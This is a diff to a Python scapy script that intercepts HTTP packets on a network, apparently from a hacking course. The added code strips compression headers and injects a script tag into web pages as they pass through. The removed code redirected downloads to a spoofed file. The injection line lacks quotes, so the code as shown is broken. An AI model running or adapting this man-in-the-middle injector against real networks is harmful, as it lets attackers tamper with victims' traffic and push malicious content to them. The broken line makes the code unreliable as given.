@@ -37,18 +37,23 @@ def flush_iptables():
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTML Request:")
-            modified_load = re.sub('Accept-Encoding:.*?\\r\\n', '', scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
+            load = re.sub(r'Accept-Encoding:.*?\r\n', '', load)
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print('[+] Response:')
+            injection_code = <script>alert("test");</script>
+            load = load.replace('</body>', f'{injection_code}</body>')
+            content_length_search = re.search(r'Content-Length:\s(\d*)', load)
+            if content_length_search:
+                content_length = content_length_search.group(1)
+                new_content_length = str(int(content_length) + len(injection_code))
+                load = load.replace(content_length, new_content_length)
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(bytes(new_packet))
-        if scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                print('[+] Response:')
-                print(scapy_packet.show)
 
-                modified_packet = set_load(scapy_packet, f'HTTP/1.1 301 Moved Permanently\nLocation: {spoof_file}\n\n')
-                packet.set_payload(bytes(modified_packet))  # Convert scapy packet to bytes for Python 3
 
     packet.accept()
 
